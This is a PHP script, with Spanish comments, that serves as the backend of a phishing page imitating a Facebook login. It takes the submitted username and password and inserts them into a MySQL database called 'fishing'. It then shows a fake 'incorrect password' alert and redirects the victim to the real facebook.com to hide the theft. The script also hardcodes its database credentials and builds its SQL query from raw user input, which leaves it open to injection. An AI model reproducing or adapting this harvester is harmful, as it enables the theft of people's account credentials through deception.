<?php
//validamos datos del servidor
$user = "ampuero";
$pass = "12345Bux@";
$host = "localhost";

//conetamos al base datos
$connection = mysqli_connect($host, $user, $pass);

//hacemos llamado al imput de formuario
$usuario = $_POST["usuario"] ;
$contraseña = $_POST["contraseña"] ;

if(!$connection) 
        {
            echo "No se ha podido conectar con el servidor" . mysql_error();
        }
  else
        {
            echo '<script>
            alert("Contraseña incorrecta");
            window.location.href = " https://www.facebook.com/"
            </script>';
            //header("Location: https://www.facebook.com/");
        }
        //indicamos el nombre de la base datos
        $datab = "fishing";
        //indicamos selecionar ala base datos
        $db = mysqli_select_db($connection,$datab);

        if (!$db)
        {
        echo "No se ha podido encontrar la Tabla";
        }
        else
        {
            
            //echo "<a href=" https://www.facebook.com/"></a>";
        }
        //insertamos datos de registro al mysql xamp, indicando nombre de la tabla y sus atributos
        $instruccion_SQL = "INSERT INTO usuarios (usuario, contraseña)
                             VALUES ('$usuario','$contraseña')";
                           
                            
        $resultado = mysqli_query($connection,$instruccion_SQL);

        
?>